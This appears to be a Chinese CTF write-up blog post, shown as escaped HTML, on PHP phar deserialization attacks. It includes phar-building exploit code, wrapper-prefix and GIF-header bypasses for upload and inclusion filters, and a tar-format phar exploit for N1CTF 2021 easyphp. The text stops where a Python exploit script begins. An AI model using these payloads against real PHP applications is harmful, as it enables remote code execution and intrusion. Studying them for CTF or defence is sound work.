&lt;p&gt;&lt;img src=&#34;/2021/11/28/%E6%B5%85%E8%B0%88Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9AN1CTF%202021%20easyphp%20&amp;%20%E5%AE%89%E6%B4%B5%E6%9D%AF2021%20EZ_TP/func.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;还有一些别的函数可用，可参考这篇：&lt;a href=&#34;https://www.freebuf.com/articles/web/205943.html&#34;&gt;https://www.freebuf.com/articles/web/205943.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;试试看？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;我们先来生成一个phar：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;TestObject&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    @&lt;span class=&#34;title function_ invoke__&#34;&gt;unlink&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;phar.phar&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$phar&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Phar&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;phar.phar&amp;quot;&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;//后缀名必须为phar&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$phar&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;startBuffering&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$phar&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;setStub&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;?php __HALT_COMPILER(); ?&amp;gt;&amp;quot;&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;//设置stub&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$o&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;TestObject&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$phar&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;setMetadata&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$o&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;//将自定义的meta-data存入manifest&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$phar&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;addFromString&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;test.txt&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;test&amp;quot;&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;//添加要压缩的文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;//签名自动计算&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$phar&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;stopBuffering&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;注意这边$o反序列化只会保存数据不会保存方法。执行完毕后，我们来观察phar文件的内容：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2021/11/28/%E6%B5%85%E8%B0%88Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9AN1CTF%202021%20easyphp%20&amp;%20%E5%AE%89%E6%B4%B5%E6%9D%AF2021%20EZ_TP/hex.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;GBMB结尾的签名以及序列化后的metadata清晰可见。&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;TestObject&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__destruct&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;Destruct called&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$filename&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;phar://phar.phar/test.txt&amp;#x27;&lt;/span&gt;;&lt;span class=&#34;comment&#34;&gt;//既然是压缩文件，我们可以如此访问其中的某个文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;title function_ invoke__&#34;&gt;file_get_contents&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$filename&lt;/span&gt;); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;在上面的程序执行之后，我们会发现它输出了“Destruct called”.这是由于phar被解析的时候，metadata被反序列化了，于是该实例被析构时调用__destruct函数。这便是反序列化漏洞的来由。&lt;/p&gt;
&lt;p&gt;PHP ≥5.3默认支持phar文件；而在PHP8中，该漏洞被修复：metadata不会自动被反序列化了。（来源请求）&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;phar-是什么&#34;&gt;&lt;a href=&#34;#phar-是什么&#34; class=&#34;headerlink&#34; title=&#34;phar:&amp;#x2F;&amp;#x2F;是什么&#34;&gt;&lt;/a&gt;&lt;strong&gt;phar:&amp;#x2F;&amp;#x2F;是什么&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;前面提到，我们解析phar文件常常使用phar:&amp;#x2F;&amp;#x2F;伪协议。CTF中，由于伪协议提供了一系列对于文件的封装协议，使得当源程序有可控的文件包含函数时，我们有机会利用这些协议控制其返回值或是完成一些预料外操作（例如反序列化）。作为伪协议的一种，由于phar本质上就是一个特殊的压缩文件，所以phar:&amp;#x2F;&amp;#x2F;和zip:&amp;#x2F;&amp;#x2F;其实有很多相似之处，都可以访问压缩包中的子文件，并且zip:&amp;#x2F;&amp;#x2F;需要文件绝对路径，phar:&amp;#x2F;&amp;#x2F;并不需要。（来源请求）&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;小tricks&#34;&gt;&lt;a href=&#34;#小tricks&#34; class=&#34;headerlink&#34; title=&#34;小tricks&#34;&gt;&lt;/a&gt;&lt;strong&gt;小tricks&lt;/strong&gt;&lt;/h2&gt;&lt;h3 id=&#34;绕过前缀过滤&#34;&gt;&lt;a href=&#34;#绕过前缀过滤&#34; class=&#34;headerlink&#34; title=&#34;绕过前缀过滤&#34;&gt;&lt;/a&gt;绕过前缀过滤&lt;/h3&gt;&lt;p&gt;队里师傅的几个example可以类比使用，都是在前缀非phar:&amp;#x2F;&amp;#x2F;的情况下调用了phar:&amp;#x2F;&amp;#x2F;&lt;/p&gt;
&lt;p&gt;compress.bzip2和compress.zlib&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$z&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;compress.bzip2://phar:///home/sx/test.phar/test.txt&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$z&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;compress.zlib://phar:///home/sx/test.phar/test.txt&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;file_get_contents&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$z&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;php:&amp;#x2F;&amp;#x2F; &lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;php://filter/read=convert.base64-encode/resource=phar://phar.phar&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;file_get_contents&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;php://filter/read=convert.base64-encode/resource=phar://phar.phar&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;hr&gt;
&lt;h3 id=&#34;简单的绕过&#34;&gt;&lt;a href=&#34;#简单的绕过&#34; class=&#34;headerlink&#34; title=&#34;简单的绕过&#34;&gt;&lt;/a&gt;简单的绕过&lt;/h3&gt;&lt;p&gt;我们可以利用stub部分前缀任意的特性：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$phar&lt;/span&gt; -&amp;gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;setStub&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;GIF89a&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;?php __HALT_COMPILER();?&amp;gt;&amp;#x27;&lt;/span&gt;);   &lt;span class=&#34;comment&#34;&gt;//设置 stub，增加 gif 文件头&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;这可以绕过一部分对文件头的检测。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;绕过前后脏数据&#34;&gt;&lt;a href=&#34;#绕过前后脏数据&#34; class=&#34;headerlink&#34; title=&#34;绕过前后脏数据&#34;&gt;&lt;/a&gt;绕过前后脏数据&lt;/h3&gt;&lt;p&gt;由于签名部分的存在，php会校验文件哈希值，并检查末尾是否为GBMB，如下是解析部分的源码：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2021/11/28/%E6%B5%85%E8%B0%88Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9AN1CTF%202021%20easyphp%20&amp;%20%E5%AE%89%E6%B4%B5%E6%9D%AF2021%20EZ_TP/src.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.dev/php/php-src&#34;&gt;https://github.dev/php/php-src&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;可见，如果末尾不是GBMB会直接导致解析失败。&lt;/p&gt;
&lt;p&gt;在CTF中利用该漏洞需要我们完成写入&amp;#x2F;上传phar，并调用文件包含函数。我们知道一句话木马由于有&lt;code&gt;&amp;lt;?php ?&amp;gt;&lt;/code&gt;这样的头尾标识存在，可以无视前后脏数据；然而对于phar，这样的骚操作被签名部分阻止了。有办法绕过吗？请参阅：&lt;a href=&#34;https://www.php.net/manual/zh/phar.converttoexecutable.php&#34;&gt;https://www.php.net/manual/zh/phar.converttoexecutable.php&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;利用convertToExecutable函数，我们可以把phar文件转为其他格式的phar文件，例如.tar和.zip格式。&lt;/p&gt;
&lt;p&gt;我们以N1CTF easyphp为例子，这题允许我们写入日志，并且可以利用phar反序列化得到flag，难点在于日志文件前后有额外脏数据，会使得我们的phar文件无法被解析。&lt;/p&gt;
&lt;p&gt;然而如果以tar格式储存phar，末尾的脏数据并不会影响解析（这是tar的格式决定的），而开头的脏数据可以在制造phar文件时就提前构造好（这样这部分数据也会被纳入签名计算），写入日志时不必写入这部分，而是令其与脏数据拼接形成合法的phar。exploit如下：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		CLASS FLAG &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__destruct&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;FLAG: &amp;quot;&lt;/span&gt; . &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;_flag;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$sb&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;sb&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$ts&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;ts&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$phar&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Phar&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$sb&lt;/span&gt;.&lt;span class=&#34;string&#34;&gt;&amp;quot;.phar&amp;quot;&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;//后缀名必须为phar&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    **&lt;span class=&#34;variable&#34;&gt;$phar&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$phar&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;convertToExecutable&lt;/span&gt;(&lt;span class=&#34;title class_&#34;&gt;Phar&lt;/span&gt;::&lt;span class=&#34;variable constant_&#34;&gt;TAR&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;//会生成*.phar.tar**&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$phar&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;startBuffering&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$phar&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;addFromString&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Time: &amp;quot;&lt;/span&gt;.&lt;span class=&#34;variable&#34;&gt;$ts&lt;/span&gt;.&lt;span class=&#34;string&#34;&gt;&amp;quot; IP: [], REQUEST: [log_type=&amp;quot;&lt;/span&gt;.&lt;span class=&#34;variable&#34;&gt;$sb&lt;/span&gt;.&lt;span class=&#34;string&#34;&gt;&amp;quot;], CONTENT: [&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;//添加要压缩的文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;//tar文件开头是第一个添加文件的的文件名，注意添加的文件顺序不要错了&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$phar&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;setStub&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;?php __HALT_COMPILER(); ?&amp;gt;&amp;quot;&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;//设置stub&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$o&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;FLAG&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;variable&#34;&gt;$o&lt;/span&gt; -&amp;gt; data = &lt;span class=&#34;string&#34;&gt;&amp;#x27;g0dsp3ed_1s_g0D&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$phar&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;setMetadata&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$o&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;//将自定义的meta-data存入manifest&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;//签名自动计算&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$phar&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;stopBuffering&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;把这个跑在本地web服务上，然后写个脚本（当时半夜赶制的很丑会留下一些垃圾文件 求轻喷 队里师傅写的干净多了）：&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span 